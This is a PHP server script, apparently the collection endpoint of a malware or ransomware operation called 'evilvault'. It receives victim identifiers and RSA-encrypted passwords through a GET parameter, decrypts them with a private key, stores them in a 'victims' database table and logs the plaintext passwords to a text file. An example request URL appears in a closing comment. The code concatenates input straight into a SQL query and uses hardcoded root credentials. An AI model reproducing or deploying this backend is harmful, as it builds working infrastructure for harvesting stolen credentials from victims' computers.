<!DOCTYPE html>
<html>
<body>

<?php
ini_set( 'error_reporting', E_ALL );
ini_set( 'display_errors', true );
set_include_path(get_include_path() . PATH_SEPARATOR . 'phpseclib');
include('phpseclib/Crypt/RSA_XML.php');

function addVictim($UUID,$computername, $username, $password) {

    $servername = "localhost";
    $db_username =  "root";
    $db_password =  "root";
    $name =  "evilvault";


    $computername = htmlspecialchars($computername, ENT_QUOTES);
    $username = htmlspecialchars($username, ENT_QUOTES);


    // Create connection
    $conn = new mysqli($servername, $db_username, $db_password, $name);
    // Check connection
    if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
    } 

    $sql = "INSERT INTO victims (UUID, ComputerName, Username, Password)
    VALUES ('".$UUID."',  
            '".$computername."',  
            '".$username."',  
            '".$password."'
            )";

    if ($conn->query($sql) === TRUE) {
        echo "New record created successfully";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    $conn->close();
    }


function decrypt($data)
    {
        $rsaserver = new Crypt_RSA_XML();
        $myfile = fopen("privatekey.xml", "r") or die("Unable to open file!");
        $privatekey = fread($myfile,filesize("privatekey.xml"));
        $rsaserver->loadKey($privatekey);
        $result = $rsaserver->decrypt(base64_decode($data));
        return $result;
    }

$myFile = "victims.txt";

$info = $_GET['info'];
list($UUID, $computername, $username, $password) = (explode("|", $info));
$decrypted_password = decrypt($password); 
$message =  "UUID: " . $UUID . "\n" . "Computername: " . $computername . "\n" . "Username: " . $username . "\n" . "Password: " . $decrypted_password . "\n---------------------------------\n";
addVictim($UUID,$computername, $username, $password);
$fh = fopen($myFile, 'a');
fwrite($fh, $message."\n");
fclose($fh);
?>


</body>
</html>


<!-- Example url
http://localhost:8888/test/evilvault.php?info=12345678-1234-1234-1234-123456789012|Yannick's computer|test|hDYuK5390qpNOqSRs1MxFdBK8a7Ud4qFeRdQRVnGY5g6fNNJURHhbSJCpVmrfHAnm3b%2F%2B1FTlp8Q3n9Fq88Xx5ixvc49WGyyVFdgNE%2FMxSJSDaajgLZ%2B%2F%2FFPE5ga7hftW9gvUXe7%2F3T9FoZos8ADAGleQqFFpIyVFgBJRtjCVOw%3D -->